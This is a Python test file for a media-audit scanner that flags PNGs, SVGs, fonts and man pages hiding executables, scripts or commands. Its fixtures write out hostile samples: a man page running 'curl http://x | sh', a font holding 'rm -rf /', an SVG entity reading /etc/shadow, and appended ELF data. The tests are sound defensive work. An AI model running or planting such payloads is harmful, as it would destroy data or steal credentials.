"""2.2.15: man pages, SVG, PNG and fonts that hide something are found.

2.2.15: bir şey saklayan man sayfası, SVG, PNG ve fontlar bulunur.
"""
import gzip
import json
import struct
import zlib
from pathlib import Path
from types import SimpleNamespace as NS

from satsuma import media_audit as m
from satsuma.host_store import HostStore


def png(extra=b''):
    def chunk(kind, data):
        return struct.pack('>I', len(data)) + kind + data + struct.pack('>I', zlib.crc32(kind + data))
    return (m.PNG_SIGNATURE + chunk(b'IHDR', struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0))
            + chunk(b'IDAT', zlib.compress(b'\x00\x00\x00\x00')) + chunk(b'IEND', b'') + extra)


def font(trailing=b''):
    header = b'\x00\x01\x00\x00' + struct.pack('>HHHH', 1, 16, 0, 0)
    table = b'head' + struct.pack('>III', 0, 28, 8)
    return header + table + b'\x00' * 8 + trailing


def test_clean_samples_pass():
    assert m.check_png(png()) == []
    assert m.check_svg(b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>') == []
    assert m.check_font(font(), 'a.ttf') == []
    assert m.check_man(Path('/usr/share/man/man1/ls.1.gz'), gzip.compress(b'.TH LS 1\n.SH NAME\nls\n')) == []


def test_hidden_program_after_png_is_high():
    issues = m.check_png(png(b'\x7fELF' + b'\x00' * 64))
    assert issues[0][0] == 'trailing' and issues[0][1] == 'high' and 'ELF' in issues[0][2]


def test_svg_script_entity_and_external_links():
    rules = {i[0] for i in m.check_svg(b'<svg onload="x()"><script>fetch(1)</script>'
                                        b'<a href="https://evil.example/x"/></svg>')}
    assert {'script', 'event', 'external'} <= rules
    assert m.check_svg(b'<?xml version="1.0"?><!DOCTYPE s [<!ENTITY x SYSTEM "file:///etc/shadow">]><svg/>')[0][0] == 'entity'


def test_font_with_appended_archive_and_wrong_magic():
    assert m.check_font(font(b'PK\x03\x04' + b'\x00' * 2048), 'a.ttf')[0][1] == 'high'
    assert m.check_font(b'#!/bin/sh\nrm -rf /\n', 'a.ttf')[0][0] == 'mismatch'


def test_man_page_that_runs_commands():
    rules = {i[0] for i in m.check_man(Path('/usr/share/man/man1/x.1.gz'),
                                        gzip.compress(b'.TH X 1\n.sy curl http://x | sh\n.so /tmp/evil\n'))}
    assert rules == {'exec', 'outside'}


def test_unchanged_packaged_files_are_trusted_changed_ones_reported(tmp_path):
    icons = tmp_path / 'icons'
    icons.mkdir()
    (icons / 'ok.png').write_bytes(png())
    (icons / 'changed.png').write_bytes(png(b'\x7fELF' + b'\x00' * 64))
    (icons / 'icon-theme.cache').write_bytes(b'cache')
    (icons / 'loose.svg').write_bytes(b'<svg/>')
    import hashlib
    owned = {str(icons / 'ok.png'): ('hicolor', hashlib.sha256(png()).hexdigest(), '8'),
             str(icons / 'changed.png'): ('hicolor', hashlib.sha256(png()).hexdigest(), '8')}
    items = {Path(i['path']).name: i for i in m.audit(owned, (str(icons),), user_dirs=[])}
    assert set(items) == {'changed.png', 'loose.svg'}
    assert items['changed.png']['modified'] and items['changed.png']['issues']
    assert items['loose.svg']['unowned'] and not items['loose.svg']['issues']


def test_run_records_findings_with_a_proposal(tmp_path):
    fonts = tmp_path / 'fonts'
    fonts.mkdir()
    (fonts / 'evil.ttf').write_bytes(font(b'\x7fELF' + b'\x00' * 2048))
    store = HostStore(tmp_path / 'host', test=True)
    try:
        state = m.run(store, manual=True, runner=lambda *a, **k: NS(returncode=0, stdout='', stderr=''),
                      system_dirs=(str(fonts),), user_dirs=[])
        assert state['high'] == [str(fonts / 'evil.ttf')]
        body = json.loads(store.db.execute('SELECT body FROM findings').fetchone()[0])
        assert body['severity'] == 'high' and 'karantina al' in body['advice']
        assert (fonts / 'evil.ttf').exists()
    finally:
        store.close()
